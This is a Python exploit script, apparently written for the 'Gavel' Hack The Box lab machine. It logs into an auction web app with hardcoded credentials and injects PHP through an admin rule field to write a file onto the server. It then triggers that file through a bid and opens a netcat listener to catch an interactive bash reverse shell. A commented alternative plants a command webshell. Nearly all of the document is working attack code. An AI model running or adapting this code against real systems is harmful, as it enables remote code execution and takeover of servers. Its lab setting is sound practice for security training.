# Made by copper_nail aka symphony2colour

import argparse
import logging
import requests
import re
import secrets
import string
import subprocess
import sys
import time


# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(levelname)s] %(message)s'
)

#Necessary URLs
LOGIN_URL = "http://gavel.htb/login.php"
BIDDING_URL = "http://gavel.htb/bidding.php"
ADMIN_URL = "http://gavel.htb/admin.php"
BID_URL = "http://gavel.htb/includes/bid_handler.php"

username = "auctioneer" #change if necessary
password = "midnight1" #change if necessary


def parse_args():
    parser = argparse.ArgumentParser(description="PoC for Gavel HTB box")
    parser.add_argument("ip", help="Your listener IP address (for reverse shell, etc.)")
    parser.add_argument("port", help="Your listener port", type=int)
    parser.add_argument("--no-listen", action="store_true", help="Skip auto listener")
    return parser.parse_args()

#Basic login
def login(username, password):
    
    session = requests.session()
    response = session.get(LOGIN_URL)

    # Get cookies
    cookie = session.cookies.get_dict()

    logging.info(f"[+] Your initial cookie is:{cookie}")
    cookie_value = cookie["gavel_session"]
    
    if not cookie_value:
        logging.warning("[-] Failed to extract PHPSESSID.")
        sys.exit(1)
    
    login_data = {
        "username": username,
        "password": password,
        }
        
    LOGIN_HEADERS = {
        "Host": "gavel.htb", 
        "User-Agent": "HTB/5.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": LOGIN_URL,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cookie": f"gavel_session={cookie_value}",
        }
        
    response = session.post(LOGIN_URL, data=login_data, headers=LOGIN_HEADERS)  
    
    new_cookie = session.cookies.get_dict()
    
    if new_cookie != cookie:
        logging.info("[+] Successful login!")
    else:
        logging.warning("Something went wrong, check your credentials")

    return session


def get_auctions(session):
    """
    Returns a list of dicts:
      [{'id': 82, 'end': 1764680199, 'current': 992}, ...]
    """
    r = session.get(BIDDING_URL)
    r.raise_for_status()
    html = r.text

    auctions = []
    now = int(time.time())

    # Split by card body so we can parse each auction independently
    blocks = re.split(r'<div class="card-body text-center">', html)[1:]

    for block in blocks:
        id_match = re.search(r'name="auction_id"\s+value="(\d+)"', block)
        end_match = re.search(r'class="timer"\s+data-end="(\d+)"', block)
        curr_match = re.search(r'<strong>Current:</strong>\s*(\d+)\s*<i', block)

        if not id_match or not end_match:
            continue

        aid = int(id_match.group(1))
        end_ts = int(end_match.group(1))
        current = int(curr_match.group(1)) if curr_match else 0

        auctions.append({"id": aid, "end": end_ts, "current": current})

    if not auctions:
        
        logging.error("[-] No auctions found on bidding.php")
        return []

    active = [a for a in auctions if a["end"] > now]
    
    if not active:
        
        logging.warning("[!] All auctions appear ended based on data-end timestamps.")
        active = auctions

    logging.info(
        "[+] Candidate auctions: "
        + ", ".join(f"{a['id']} (end={a['end']}, current={a['current']})" for a in active)
    )
    return active

    
def gen_shell_name(prefix="shell_", length=8):
    """
    Generate something like shell_ab12cd34.php
    Only [a-z0-9] so it’s safe to drop into single quotes.
    """
    alphabet = string.ascii_lowercase + string.digits
    rand = ''.join(secrets.choice(alphabet) for _ in range(length))
    return f"{prefix}{rand}.php"
    
def send_webshell_text(session, auctions):
    """
    Inject a webshell via admin rule for each auction dict in `auctions`.
    auctions: list of {'id': ..., 'end': ...}
    Returns the shell_name for reference.
    """
    # If someone passes a single dict by mistake, normalize
    if isinstance(auctions, dict):
        auctions = [auctions]

    shell_name = gen_shell_name()

    headers = {
        "Host": "gavel.htb",
        "User-Agent": "HTB/5.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": ADMIN_URL,
        "Origin": "http://gavel.htb",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "Connection": "keep-alive",
    }
    
    php_code = (
            f'<?php '
            f'$ip="{ip}";'
            f'$port={port};'
            f'$sock=fsockopen($ip,$port);'
            f'$descriptorspec=array(0=>$sock,1=>$sock,2=>$sock);'
            f'$proc=proc_open("/bin/bash -i",$descriptorspec,$pipes);'
            f'?>'
        )
        
   #rule = f"file_put_contents('{shell_name}','<?php system($_GET[\"c\"]); ?>'); return true;" Uncomment if you want to work with a webshell
    rule = f"file_put_contents('{shell_name}','{php_code}'); return true;"
    
    for auction in auctions:
    
        auction_id = auction["id"]          # IMPORTANT
        logging.info(f"[+] Using auction_id={auction_id}")

        data = {
            "auction_id": str(auction_id),
            "rule": rule,
            "message": "test",
        }

        r = session.post(ADMIN_URL, data=data, headers=headers)
        logging.info(f"[+] admin.php responded with {r.status_code}")

        if r.status_code != 200:
            logging.warning(f"[-] Unexpected status for auction_id={auction_id}")
            
    logging.info(f"[+] Shell name is: {shell_name}")
    
    return shell_name

    

def place_bid(session, auction_id, bid_amount):
    """
    Send a multipart/form-data POST to includes/bid_handler.php
    to trigger the rule for a given auction_id.
    Returns a JSON dict like {"success": True/False, "message": "..."}.
    """
    headers = {
        "Host": "gavel.htb",
        "User-Agent": "HTB/5.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "http://gavel.htb",
        "Referer": "http://gavel.htb/bidding.php",
        "Connection": "keep-alive",
    }

    files = {
        "auction_id": (None, str(auction_id)),
        "bid_amount": (None, str(bid_amount)),
    }

    logging.info(f"[+] Triggering bid for auction_id={auction_id}, bid={bid_amount}")
    r = session.post(BID_URL, headers=headers, files=files)

    logging.info(f"[+] bid_handler.php responded with {r.status_code}")
    try:
        j = r.json()
        logging.info(f"[+] Response JSON: {j}")
    except ValueError:
        j = {}
        logging.debug(r.text)

    return j   # <-- CRITICAL: return dict, NOT Response


def start_listener(port):
    logging.info(f"[+] Starting listener on port {port}...")

    return subprocess.Popen(
        ["nc", "-lvnp", str(port)],
        stdin=None,
        stdout=None,
        stderr=subprocess.DEVNULL
    )

def trigger_shell(session, shell_name):
    """
    Simple HTTP GET to execute the reverse shell payload.
    """
    url = f"http://gavel.htb/includes/{shell_name}"
    logging.info(f"[+] Triggering shell via {url}")
    try:
        r = session.get(url, timeout=5)
        logging.info(f"[+] Trigger request status: {r.status_code}")
    except requests.RequestException as e:
        logging.warning(f"[!] Error while triggering shell: {e}")

    
if __name__ == "__main__":     
        
    args = parse_args()
    ip = args.ip
    port = args.port
        
    if not (1 <= port <= 65535):
        sys.exit("[-] Invalid port number")
    
    if port > 10000:
        logging.warning("[!] Ports above 10000 may be blocked by HTB or your local firewall. Use ports like 4444, 9001, or 5050.")
    elif port < 1024:
        logging.warning("[!] Ports below 1024 require admin privileges to work as intended")
      
    exploit_session = login(username, password)
    auction_ids = get_auctions(exploit_session)
    reverse_shell_name = send_webshell_text(exploit_session, auction_ids)
    
    for auction in auction_ids:
       
        bid_amount = auction["current"] + 1
        resp = place_bid(exploit_session, auction["id"], bid_amount)

        if resp.get("success"):
            logging.info(
                f"[+] Successful bid on auction_id={auction['id']} "
                f"(current={auction['current']}, bid={bid_amount}), stopping loop"
            )
            break
            
        else:
            logging.warning(f"[-] Not a successful bid on auction_id={auction['id']}: {resp.get('message')}")

    if not args.no_listen:
    
        try:
            listener_proc = start_listener(port)
            time.sleep(2)  # Give listener time to spin up
            trigger_shell(exploit_session, reverse_shell_name)
            listener_proc.wait()
            
        except KeyboardInterrupt:
            print("\n[!] Interrupted. Cleaning up...")
            listener_proc.terminate()
    else:
        trigger_shell(exploit_session, reverse_shell_name)
